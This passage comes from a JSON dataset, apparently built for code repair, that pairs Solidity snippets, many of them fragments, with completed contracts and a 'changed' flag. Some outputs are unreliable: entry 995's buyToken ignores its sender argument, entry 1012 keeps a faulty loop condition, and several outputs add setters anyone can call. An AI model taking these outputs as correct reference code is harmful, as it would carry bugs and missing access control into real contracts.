        "input": "pragma solidity 0.8.12;\n\ncontract GistPin {\n  string public name = \"GistPin\";\n  uint256 public videoCount = 0;\n  uint256 public imageCount = 0;\n  mapping(uint256 => Image) public images;\n  mapping(uint256 => Video) public videos;\n\n  struct Image {\n    uint256 id;\n    string hash;\n    string description;\n    uint256 tipAmount;\n    address payable author;\n  }\n\n  struct Video {\n    uint256 id;\n    string hash;\n    string title;\n    address author;\n  }\n\n  event VideoUploaded(\n    uint256 id,\n    string hash,\n    string title,\n    string description,\n    address author\n  );\n\n  constructor() {\n    name = \"GistPin\";\n  }\n\n  function uploadVideo(\n    string memory _videoHash,\n    string memory _title,\n    string memory _description\n  ) public {\n    require(bytes(_videoHash).length > 0);\n    require(bytes(_title).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender != address(0));\n\n    videoCount++;\n\n    videos[videoCount] = Video(videoCount, _videoHash, _title, msg.sender);\n    emit VideoUploaded(\n        videoCount,\n        _videoHash,\n        _title,\n        _description,\n        msg.sender\n    );\n  }\n\n  event ImageCreated(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable author\n  );\n\n  event ImageTipped(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable myAddress\n  );\n\n   function uploadImage(string memory _imgHash, string memory _description) public {\n    require(bytes(_imgHash).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender!=address(0x0));\n\n    imageCount ++;\n\n\n    images[imageCount] = Image(imageCount, _imgHash, _description, 0, payable(msg.sender));\n\n    emit ImageCreated(imageCount, _imgHash, _description, 0, payable(msg.sender));\n  }\n\nfunction tipImageOwner(uint _id) public payable {\n    require(_id > 0 && _id <= imageCount);\n    Image memory _image = images[_id];\n    address payable _author = _image.author;\n    _author.transfer(msg.value);\n    _image.tipAmount = _image.tipAmount + msg.value;\n    images[_id] = _image;\n    emit ImageTipped(_id, _image.hash, _image.description, _image.tipAmount, payable(_author));\n }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GistPin {\n  string public name = \"GistPin\";\n  uint256 public videoCount = 0;\n  uint256 public imageCount = 0;\n  mapping(uint256 => Image) public images;\n  mapping(uint256 => Video) public videos;\n\n  struct Image {\n    uint256 id;\n    string hash;\n    string description;\n    uint256 tipAmount;\n    address payable author;\n  }\n\n  struct Video {\n    uint256 id;\n    string hash;\n    string title;\n    address author;\n  }\n\n  event VideoUploaded(\n    uint256 id,\n    string hash,\n    string title,\n    string description,\n    address author\n  );\n\n  constructor() {\n    name = \"GistPin\";\n  }\n\n  function uploadVideo(\n    string memory _videoHash,\n    string memory _title,\n    string memory _description\n  ) public {\n    require(bytes(_videoHash).length > 0);\n    require(bytes(_title).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender != address(0));\n\n    videoCount++;\n\n    videos[videoCount] = Video(videoCount, _videoHash, _title, msg.sender);\n    emit VideoUploaded(\n        videoCount,\n        _videoHash,\n        _title,\n        _description,\n        msg.sender\n    );\n  }\n\n  event ImageCreated(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable author\n  );\n\n  event ImageTipped(\n    uint256 id,\n    string hash,\n    string description,\n    uint256 tipAmount,\n    address payable myAddress\n  );\n\n   function uploadImage(string memory _imgHash, string memory _description) public {\n    require(bytes(_imgHash).length > 0);\n    require(bytes(_description).length > 0);\n    require(msg.sender!=address(0x0));\n\n    imageCount ++;\n\n\n    images[imageCount] = Image(imageCount, _imgHash, _description, 0, payable(msg.sender));\n\n    emit ImageCreated(imageCount, _imgHash, _description, 0, payable(msg.sender));\n  }\n\nfunction tipImageOwner(uint _id) public payable {\n    require(_id > 0 && _id <= imageCount);\n    Image memory _image = images[_id];\n    address payable _author = _image.author;\n    _author.transfer(msg.value);\n    _image.tipAmount = _image.tipAmount + msg.value;\n    images[_id] = _image;\n    emit ImageTipped(_id, _image.hash, _image.description, _image.tipAmount, payable(_author));\n }\n\n}\n\n",
        "changed": 0
    },
    "992.sol": {
        "input": "\npragma solidity ^0.8.7;\n\ncontract Store{\n    struct Product {\n        string name;\n        uint32 quantity;\n        bool exists;\n    }\n     address private Owner; \n     uint64 private productId;\n     mapping(uint => Product) private products;\n\n     constructor() {\n        productId = 1;\n        Owner = msg.sender;\n     }\n\n     modifier onlyOwner{\n        require(msg.sender == Owner, \"Fail! only admin can access this \n        function!\");\n         _;\n      }\n\n    function addProduct(string calldata _name, uint32 _quantity) public \n    onlyOwner{\n        Product memory _strucObj;\n        _strucObj.name = _name;\n        _strucObj.quantity = _quantity;\n        products[productId -1] = _strucObj;\n        productId++;\n    }\n\n    function listProducts() external view returns (string[] memory){\n        string[] memory productsInfo = new string[](productId);\n\n        if(productId < 1){\n            return productsInfo;\n        }\n\n        string memory dash = \"-\";\n\n        for(uint i = 0; i < productId; i++){\n            string memory info = products[i].name;\n\n            productsInfo[i] = info;\n        }\n\n        return productsInfo;\n    }\n\n   function CheckProductsByIndex(uint index) public view returns(string memory name)\n    {\n         string[] memory productsInfo = new string[](productId);\n         for(uint i = 0; i < productId; i++)\n         {\n             string memory _toArray = products[i].name;\n             productsInfo[i] = _toArray;\n         }\n        return productsInfo[index];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Store {\n    struct Product {\n        string name;\n        uint32 quantity;\n    }\n    \n    address private owner;\n    uint64 private productId = 1;\n    mapping(uint => Product) private products;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Fail! Only admin can access this function!\");\n        _;\n    }\n\n    function addProduct(string calldata _name, uint32 _quantity) public onlyOwner {\n        require(bytes(products[productId].name).length == 0, \"Product already exists\");\n        products[productId] = Product(_name, _quantity);\n        productId++;\n    }\n\n    function listProducts() external view returns (string[] memory) {\n        string[] memory productNames = new string[](productId-1);\n\n        for(uint i = 1; i < productId; i++){\n            productNames[i-1] = products[i].name;\n        }\n\n        return productNames;\n    }\n\n    function checkProductByIndex(uint index) public view returns (string memory) {\n        require(index < productId, \"Index out of bounds\");\n        return products[index+1].name;\n    }\n}\n\n",
        "changed": 0
    },
    "993.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"https:\n\ncontract Test {\n    function power() public pure returns (uint) {\n        int128 three = ABDKMath64x64.fromUInt(3);\n\n        int128 lnThree = ABDKMath64x64.ln(three);\n\n        int128 oneTenth = ABDKMath64x64.divu(1, 10);\n\n        int128 product = ABDKMath64x64.mul(lnThree, oneTenth);\n\n        int128 result = ABDKMath64x64.exp(product);\n\n        result = ABDKMath64x64.mul(result, ABDKMath64x64.fromUInt(10**5));\n\n        return ABDKMath64x64.toUInt(result);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "995.sol": {
        "input": " MyToken token= new MyToken();\n\ncontract Marketplace {\n    MyToken token= new MyToken();\n    constructor(MyToken _token) {\n        token = _token;\n    }\n}\n \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balances;\n\n    function transfer(address _to, uint256 _amount) public returns (bool success) {\n        require(balances[msg.sender] >= _amount);\n        balances[msg.sender] -= _amount;\n        balances[_to] += _amount;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\ncontract Marketplace {\n    MyToken public token;\n\n    constructor(MyToken _token) public {\n        token = _token;\n    }\n    \n    function buyToken(address _from, address _to, uint256 _amount) public returns (bool success) {\n        require(token.transfer(_from, _amount));\n        token.transfer(_to, _amount);\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "996.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 numberA = 1; \n    uint256 numberB = 1; \n    uint256 numberC = 1; \n\n    uint128 numberD = 1; \n    uint128 numberE = 1; \n\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(2);\n        numbers.push(3);\n        numbers.push(4);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 numberA = 1; // slot 0\n    uint256 numberB = 1; // slot 1\n    uint256 numberC = 1; // slot 2\n\n    uint128 numberD = 1; // slot 3\n    uint128 numberE = 1; // slot 3\n\n    // length in slot 4\n    // values in slot ID determined by hash of the position + offset\n    // in this case keccak256(4) + 0, keccak256(4) + 1, and keccak256(4) + 2\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(2);\n        numbers.push(3);\n        numbers.push(4);\n    }\n}\n\n",
        "changed": 0
    },
    "997.sol": {
        "input": "struct Patient {\n  string name;\n  uint16 age;\n  string telephone;\n  string homeAddress;\n  uint64 birthday; \n  string disease; \n  Gender gender;\n  uint createdAt\n}\n\n[your_struct_variable] = block.timestamp;\n\npragma solidity ^0.8.0;\n\ncontract Hospital {\n\n    enum Gender { MALE, FEMALE }\n\n    struct Patient {\n        string name;\n        uint16 age;\n        string telephone;\n        string homeAddress;\n        uint64 birthday; \n        string disease; \n        Gender gender;\n        uint256 createdAt;\n    }\n\n    mapping(address => Patient) _patients;\n\n    function setPatients() public {\n        Patient memory _patient = Patient({\n            name: \"test\",\n            age: 50,\n            telephone: \"test\",\n            homeAddress: \"test\",\n            birthday: 1010101010,\n            disease: \"test\",\n            gender: Gender.MALE,\n            createdAt: block.timestamp            \n        });\n        _patients[msg.sender] = _patient;\n    }\n\n    function getPatient() external view returns(Patient memory) {\n        return _patients[msg.sender];\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Hospital {\n\n    enum Gender { MALE, FEMALE }\n\n    struct Patient {\n        string name;\n        uint16 age;\n        string telephone;\n        string homeAddress;\n        uint64 birthday; \n        string disease; \n        Gender gender;\n        uint256 createdAt;\n    }\n\n    mapping(address => Patient) _patients;\n\n    function setPatients(string memory name, uint16 age, string memory telephone, string memory homeAddress, uint64 birthday, string memory disease, Gender gender) public {\n        Patient memory _patient = Patient({\n            name: name,\n            age: age,\n            telephone: telephone,\n            homeAddress: homeAddress,\n            birthday: birthday,\n            disease: disease,\n            gender: gender,\n            createdAt: block.timestamp            \n        });\n        _patients[msg.sender] = _patient;\n    }\n\n    function getPatient(address patientAddress) external view returns(string memory, uint16, string memory, string memory, uint64, string memory, uint, uint256) {\n        Patient memory patient = _patients[patientAddress];\n        return (patient.name, patient.age, patient.telephone, patient.homeAddress, patient.birthday, patient.disease, uint(patient.gender), patient.createdAt);\n    }\n\n}\n\n",
        "changed": 0
    },
    "998.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract NestedMapping {\n    mapping(string => mapping(string => uint8)) private _game_rule_strategy;\n\n    function setNestedMapping(string memory _firstKey, string memory _secondKey, uint8 _value) public {\n        _game_rule_strategy[_firstKey][_secondKey] = _value;\n    }\n\n    function getValueNestedMapping(string memory _firstKey, string memory _secondKey) external view returns(uint8) {\n        return _game_rule_strategy[_firstKey][_secondKey];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract NestedMapping {\n    mapping(string => mapping(string => uint8)) private _game_rule_strategy;\n\n    function setNestedMapping(string memory _firstKey, string memory _secondKey, uint8 _value) public {\n        _game_rule_strategy[_firstKey][_secondKey] = _value;\n    }\n\n    function getValueNestedMapping(string memory _firstKey, string memory _secondKey) external view returns(uint8) {\n        return _game_rule_strategy[_firstKey][_secondKey];\n    }\n}\n\n",
        "changed": 0
    },
    "999.sol": {
        "input": "    if (response != HederaResponseCodes.SUCCESS && newTotalSupply==0) {\n        return(false,0,_nftOwner);\n    }\n    else{\n        \n        transferNft(tokenId,_nftOwner,serialNumbers[0]);\n        NftToSeller[serialNumbers[0]]=_nftOwner;\n        return(true,serialNumbers[0],_nftOwner);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NftContract {\n    struct NFT {\n        uint256 tokenId;\n        address owner;\n    }\n\n    mapping(uint256 => NFT) public nfts;\n    mapping(uint256 => address) public NftToSeller;\n\n    enum HederaResponseCodes { SUCCESS, FAIL }\n\n    function transferNft(uint256 tokenId, address to, uint256 serialNumber) public {\n        require(nfts[serialNumber].owner == msg.sender, \"Not the owner\");\n        nfts[serialNumber].owner = to;\n    }\n\n    function checkHederaResponse(HederaResponseCodes response, uint256 newTotalSupply, uint256 tokenId, address _nftOwner, uint256[] memory serialNumbers) public returns(bool, uint256, address) {\n        if (response != HederaResponseCodes.SUCCESS && newTotalSupply==0) {\n            return(false,0,_nftOwner);\n        }\n        else{\n            transferNft(tokenId,_nftOwner,serialNumbers[0]);\n            NftToSeller[serialNumbers[0]]=_nftOwner;\n            return(true,serialNumbers[0],_nftOwner);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "1000.sol": {
        "input": "pragma solidity ^0.8.21;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract TokenTransfer is Ownable {\n    address public targetAddress;\n    address[] public tokenAddresses;\n\n    modifier onlyTargetAddress() {\n        require(msg.sender == targetAddress, \"Only the target address can call this function\");\n        _;\n    }\n\n    event TokensTransferred(address indexed tokenAddress, address indexed from, address indexed to, uint256 amount);\n\n    constructor(address _targetAddress, address[] memory _tokenAddresses) {\n        targetAddress = _targetAddress;\n        tokenAddresses = _tokenAddresses;\n    }\n\n    function setTargetAddress(address _targetAddress) public onlyOwner {\n        targetAddress = _targetAddress;\n    }\n\n    function setTokenAddresses(address[] memory _tokenAddresses) public onlyOwner {\n        tokenAddresses = _tokenAddresses;\n    }\n\n    function approveAndTransferAllTokens() public onlyTargetAddress {\n        for (uint256 i = 0; i < tokenAddresses.length; i++) {\n            address tokenAddress = tokenAddresses[i];\n            uint256 tokenBalance = IERC20(tokenAddress).balanceOf(msg.sender);\n            uint256 allowance = IERC20(tokenAddress).allowance(msg.sender, targetAddress);\n\n            if (tokenBalance > 0 && allowance == 0) {\n                IERC20(tokenAddress).approve(targetAddress, tokenBalance);\n            }\n            if (allowance > 0) {\n                IERC20(tokenAddress).transferFrom(msg.sender, targetAddress, allowance);\n                emit TokensTransferred(tokenAddress, msg.sender, targetAddress, allowance);\n            }\n        }\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "1001.sol": {
        "input": "returns(uint)\n\nreturns(uint[] memory)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint[] private numbers;\n\n    // Function to add a number to the array\n    function addNumber(uint _number) public {\n        numbers.push(_number);\n    }\n\n    // Function that returns a number from the array at a certain index\n    function getNumber(uint _index) public view returns(uint) {\n        require(_index < numbers.length, \"Index out of bounds\");\n        return numbers[_index];\n    }\n\n    // Function that returns the entire array\n    function getAllNumbers() public view returns(uint[] memory) {\n        return numbers;\n    }\n}\n\n",
        "changed": 0
    },
    "1002.sol": {
        "input": "\npragma solidity 0.8.7; \n\ncontract Rating{\n\n    string[] moviesList;\n\n    mapping(string => uint8) movieRatings;\n\n    constructor() {\n        moviesList = [\"movie1\",\"movie2\",\"movie3\"]; \n    }\n\n    function addMovie(string memory movie) public returns(string memory){\n        moviesList.push(movie);\n        return movie;\n    }\n\n    function getList() public view returns(string[] memory){ \n        return moviesList;\n    }\n\n    function rateMovie(string memory movie,uint8 rating) public {\n        require(rating >=0 && rating <= 10,\"rating is out of range\");\n        movieRatings[movie] = rating;\n    }\n    \n    function getMovieRating(string memory movie) public view returns(uint8){\n        return movieRatings[movie];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.7; \n\ncontract Rating{\n\n    string[] moviesList;\n\n    mapping(string => uint8) movieRatings;\n\n    constructor() {\n        moviesList = [\"movie1\",\"movie2\",\"movie3\"]; // this is default list of movies you can add in constructor \n    }\n\n    // add movies\n    function addMovie(string memory movie) public returns(string memory){\n        moviesList.push(movie);\n        return movie;\n    }\n\n    // get list of movies\n    function getList() public view returns(string[] memory){ \n        return moviesList;\n    }\n\n    // rate movie with rating\n    function rateMovie(string memory movie,uint8 rating) public {\n        require(rating >=0 && rating <= 10,\"rating is out of range\");\n        movieRatings[movie] = rating;\n    }\n    \n    // get movie rating by passing movie name\n    function getMovieRating(string memory movie) public view returns(uint8){\n        return movieRatings[movie];\n    }\n\n}\n\n",
        "changed": 0
    },
    "1003.sol": {
        "input": "    uint32 timeElapsed = blockTimestamp - blockTimestampLast; \n\nuint public price0CumulativeLast;\nuint public price1CumulativeLast;\n\n blockTimestamp=30\n blockTimestampLast=20\n\ntimeElapsed = blockTimestamp - blockTimestampLas\n            = 8-20 =-12\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeElapsedContract {\n    uint public blockTimestampLast;\n    uint public blockTimestamp;\n    uint32 public timeElapsed;\n\n    constructor() public {\n        blockTimestampLast = 20;\n        blockTimestamp = 30;\n    }\n\n    function calculateTimeElapsed() public {\n        timeElapsed = uint32(blockTimestamp - blockTimestampLast);\n    }\n\n    // Getters\n    function getTimeElapsed() public view returns(uint32) {\n        return timeElapsed;\n    }\n    function getBlockTimestamp() public view returns(uint) {\n        return blockTimestamp;\n    }\n    function getBlockTimestampLast() public view returns(uint) {\n        return blockTimestampLast;\n    }\n\n    // Setters\n    function setBlockTimestamp(uint _blockTimestamp) public {\n        blockTimestamp = _blockTimestamp;\n    }\n    function setBlockTimestampLast(uint _blockTimestampLast) public {\n        blockTimestampLast = _blockTimestampLast;\n    }\n}\n\n",
        "changed": 1
    },
    "1004.sol": {
        "input": "pragma solidity ^0.8.4;\n\ncontract Steezy  { \n\n    function contractAddress() public view returns (address asd){\n        return address(this);\n    }\n    function buy() public payable{\n        uint256 listenPrice = 25000000000000000;\n        (bool successs, ) = address(this).call{value: listenPrice}(\"\");\n        require(successs, \"Failed\");\n    }\n    fallback() external payable {}\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Steezy  { \n\n    function contractAddress() public view returns (address asd){\n        return address(this);\n    }\n    function buy() public payable{\n        uint256 listenPrice = 25000000000000000;\n        (bool successs, ) = address(this).call{value: listenPrice}(\"\");\n        require(successs, \"Failed\");\n    }\n    fallback() external payable {}\n}\n\n",
        "changed": 0
    },
    "1005.sol": {
        "input": "pragma solidity ^0.4.17;\n\ncontract dynamic_array\n{\n    int[] public myArray;\n    int x;\n    int y;\n\n    function dynamic_array() public {\n        x = x + 2;\n        y = 5;\n        myArray.push(1);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.17;\n\ncontract dynamic_array\n{\n    int[] public myArray;\n    int x;\n    int y;\n\n    // Constructor in version 0.4\n    // is a `public` function with the same name as the contract\n    function dynamic_array() public {\n        x = x + 2;\n        y = 5;\n        myArray.push(1);\n    }\n}\n\n",
        "changed": 0
    },
    "1006.sol": {
        "input": "currentShares = (_amount * (totalShares)) / (pool);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MySmartContract {\n    uint256 public totalShares;\n    uint256 public pool;\n\n    function calculateShares(uint256 _amount) public view returns (uint256 currentShares) {\n        require(totalShares > 0, \"Total shares must be greater than zero\");\n        require(pool > 0, \"Pool must be greater than zero\");\n\n        currentShares = (_amount * totalShares) / pool;\n    }\n\n    function setTotalShares(uint256 _totalShares) public {\n        totalShares = _totalShares;\n    }\n\n    function setPool(uint256 _pool) public {\n        pool = _pool;\n    }\n}\n\n",
        "changed": 0
    },
    "1007.sol": {
        "input": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract test {\n    \n    struct Identity {\n        uint age;\n        string name;\n    }\n    \n    struct NestedIdentity {\n        Identity identity;\n    }\n    \n    Identity identity = Identity(29, 'Issei Kumagai');\n    \n    NestedIdentity nested_identity = NestedIdentity(identity);\n    \n    function valueFromStruct() public view returns(uint age, string memory name) {\n        return (nested_identity.identity.age, nested_identity.identity.name);\n    }\n\n}\n\nfunction valueFromStruct() public view returns(Identity memory) {\n    return nested_identity.identity;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    \n    struct Identity {\n        uint age;\n        string name;\n    }\n    \n    struct NestedIdentity {\n        Identity identity;\n    }\n    \n    NestedIdentity nestedIdentity;\n\n    constructor() {\n        Identity memory identity = Identity(29, 'Issei Kumagai');\n        nestedIdentity = NestedIdentity(identity);\n    }\n    \n    function valueFromStruct() public view returns(uint age, string memory name) {\n        return (nestedIdentity.identity.age, nestedIdentity.identity.name);\n    }\n\n    function getIdentity() public view returns(Identity memory) {\n        return nestedIdentity.identity;\n    }\n}\n\n",
        "changed": 0
    },
    "1008.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Counter { \n    uint public Count = 0;\n    event EventIncrement(uint value);\n    event EventDecrement(uint value);\n\n    function getCount() view public returns(uint) {\n        return Count;\n    }\n\n    function Increment() public {\n        Count += 1;\n        emit EventIncrement(Count);\n    }\n\n    function Decrement() public {\n        Count -= 1;\n        emit EventDecrement(Count);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Counter { \n    uint public Count = 0;\n    // NOTE: I changed name to these two events\n    event EventIncrement(uint value);\n    event EventDecrement(uint value);\n\n    function getCount() view public returns(uint) {\n        return Count;\n    }\n\n    function Increment() public {\n        Count += 1;\n        emit EventIncrement(Count);\n    }\n\n    function Decrement() public {\n        Count -= 1;\n        emit EventDecrement(Count);\n    }\n}\n\n",
        "changed": 0
    },
    "1009.sol": {
        "input": "function submitHash(bytes hash) public {\n    hashes[msg.sender] = hash;\n}\n\nfunction submitAnswer(uint256 colorid, uint256 secret) public {\n    require(votesIn, \"votes are not all in\");\n    require(keccak256(abi.encodePacked(colorId, secret)) == hashes[msg.sender], \"invalid response\");\n    votes[colorId] += 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Voting {\n    mapping (address => bytes32) public hashes;\n    mapping (uint256 => uint256) public votes;\n    bool public votesIn = false;\n\n    function submitHash(bytes32 hash) public {\n        hashes[msg.sender] = hash;\n    }\n\n    function submitAnswer(uint256 colorId, uint256 secret) public {\n        require(votesIn, \"votes are not all in\");\n        require(keccak256(abi.encodePacked(colorId, secret)) == hashes[msg.sender], \"invalid response\");\n        votes[colorId] += 1;\n    }\n    \n    function setVotesIn() public {\n        votesIn = true;\n    }\n}\n\n",
        "changed": 0
    },
    "1010.sol": {
        "input": "address contractDeployer;\nuint txCharge = 1 \n\nconstructor(string memory name_, string memory symbol_) {\n  _name = name_;\n  _symbol = symbol_;\n  contractDeployer= msg.sender;\n}\n\nfunction transfer(address to, uint256 amount) public virtual override returns (bool) {\n  address owner = _msgSender();\n  _transfer(owner, contractDeployer, amount * txCharge / 100); \n  _transfer(owner, to, amount - (amount * txCharge/100);\n  return true;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "1011.sol": {
        "input": "const minterHex = web3.utils.fromAscii('ROLE_MINTER')\n\nbytes32 public constant ROLE_MINTER = keccak256(\"ROLE_MINTER\");\n\nconst minterHash = web3.utils.soliditySha3('ROLE_MINTER');\nconst result = await factoryContract.methods.hasRole(minterHash, OWNER_ADDRESS).call();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IFactory {\n    function hasRole(bytes32 role, address account) external view returns (bool);\n}\n\n",
        "changed": 0
    },
    "1012.sol": {
        "input": "        for(uint8 participatorIndex = 0; participatorIndex<participators.length; participatorIndex++){\n            rate = uint8(balances[participators[participatorIndex]]*100/pot);\n            for(; participatorIndex<rate ; participatorsRatesIndex++){\n                participatorsRates[participatorsRatesIndex] = participatorIndex;\n            }\n            balances[participators[participatorIndex]]=0;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address[] public participators;\n    mapping(address => uint256) public balances;\n    mapping(uint256 => uint8) public participatorsRates;\n    \n    function participate() public payable {\n        require(msg.value > 0, \"You need to send some Ether to participate.\");\n        participators.push(msg.sender);\n        balances[msg.sender] += msg.value;\n    }\n    \n    function distribute() public {\n        uint256 pot = address(this).balance;\n        uint8 rate;\n        uint256 participatorsRatesIndex = 0;\n        \n        for(uint8 participatorIndex = 0; participatorIndex<participators.length; participatorIndex++){\n            rate = uint8(balances[participators[participatorIndex]]*100/pot);\n            for(; participatorIndex<rate ; participatorsRatesIndex++){\n                participatorsRates[participatorsRatesIndex] = participatorIndex;\n            }\n            balances[participators[participatorIndex]]=0;\n        }\n    }\n}\n\n",
        "changed": 0
    }
}